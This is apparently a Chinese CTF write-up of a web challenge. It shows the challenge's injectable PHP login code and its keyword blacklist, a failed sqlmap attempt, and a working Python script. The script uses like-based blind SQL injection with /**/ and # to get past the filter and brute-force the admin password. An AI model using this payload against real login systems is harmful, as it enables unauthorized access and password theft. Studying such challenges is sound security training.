::: info
2021-第五届空间智能安全大赛-Web-mysql_injection
:::

##  1、思路

（1）查看源代码

F12 查看源代码，首行提示 <!-- source code here:  /?source -->

访问 `http://challenge-52acc3f9cc322c2d.sandbox.ctfhub.com:10800/?sources`

```php
<?php
include_once("lib.php");
function alertMes($mes,$url){
    die("<script>alert('{$mes}');location.href='{$url}';</script>");
}

function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'admin') {
        alertMes('only admin can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes("something wrong",'index.php');
    }
    if ($row['password'] === $password) {
    die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }
}

if(isset($_GET['source'])){
  show_source(__FILE__);
  die;
}
?>


<!-- source code here:  /?source -->


<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="initial-scale=1.0, user-scalable=no, width=device-width">
<title>SQLi</title>
<link rel="stylesheet" type="text/css" href="./files/reset.css">
<link rel="stylesheet" type="text/css" href="./files/scanboardLogin.css">
<link rel="stylesheet" type="text/css" href="./files/animsition.css">
</head>
<body>
  <div class="wp animsition" style="animation-duration: 0.8s; opacity: 1;">
    <div class="boardLogin">
      <div class="logo ">
        LOGIN AS ADMIN!
      </div>
      <form action="index.php" method="post">
        <div class="inpGroup">
          <span class="loginIco1"></span>
          <input type="text" name="username" placeholder="请输入您的用户名">
        </div>

        <div class="inpGroup">
          <span class="loginIco2"></span>
          <input type="password" name="password" placeholder="请输入您的密码">
        </div>
        <div class="prompt">
          <p class="success">输入正确</p>
        </div>

        <button class="submit">登录</button>
      </form>
    </div>
  </div>
  <div id="particles-js"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="3360" height="1780"></canvas></div>

<script type="text/javascript" src="./files/jquery.min.js"></script>
<script type="text/javascript" src="./files/jquery.animsition.js"></script>
<script src="./files/particles.min.js"></script>
<script src="./files/app.js"></script>
<script type="text/javascript">
  $(".animsition").animsition({
      inClass               :   'fade-in',
      outClass              :   'fade-out',
      inDuration            :    800,
      outDuration           :    1000,
      linkElement           :   '.animsition-link',

      loading               :    false,
      loadingParentElement  :   'body',
      loadingClass          :   'animsition-loading',
      unSupportCss          : [ 'animation-duration',
                                '-webkit-animation-duration',
                                '-o-animation-duration'
                              ],


      overlay               :   false,

      overlayClass          :   'animsition-overlay-slide',
      overlayParentElement  :   'body'
    });
</script>

</body></html>
```

（2）分析

- 用户名为 <font color=red>admin</font>，密码未知
- SQL 注入检测，过滤关键词如下，<font color=red>like、/**/、'、%</font> 都没有被过滤

```php
function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}
```

- 表为 <font color=red>user</font> `$sql="SELECT password FROM users WHERE username='admin' and password='$password';";`

- 如果密码正确，输出 flag，并退出当前脚本 `die($FLAG)`

`if ($row['password'] === $password) {
    die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }`

（3）bp 抓包，POST 保存为 txt 文件

```
POST /index.php HTTP/1.1
Host: challenge-52acc3f9cc322c2d.sandbox.ctfhub.com:10800
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-52acc3f9cc322c2d.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-52acc3f9cc322c2d.sandbox.ctfhub.com:10800/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&password=123124
```

sqlmap，行不通

```shell
➜  sqlmap git:(master) python sqlmap.py -r 1.txt -p password --dbs

[10:31:21] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable

[10:38:54] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```

## 2、爆破密码

### 永真

`where 1=1`，但等于号在过滤列表中

`where 1'`

### 空格

`/**/`

### like 检索子串

`%` 包含零个或多个字符的任意字符串

`{}` 为占位符

`like/**/'{password}%'`

### 注释后面内容

`#`

### 时间盲注

`time.sleep(0.1)`

## 3、exp

```python
import requests
import time


url = "http://challenge-1397b1b361ec1341.sandbox.ctfhub.com:10800/index.php"
alp = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~"
flag = ""
user = "admin"


if __name__ == '__main__':
    while True:
        for i in alp:
            data = {
                "username": user,
                "password": f"1'or/**/password/**/like/**/'{flag+i}%'#"
            }
            resp = requests.post(url=url, data=data)
            
            time.sleep(0.1)
            if "something wrong" not in resp.text:
                flag = flag + i
                print(flag)
                break
            elif "~" in i:
                break
```

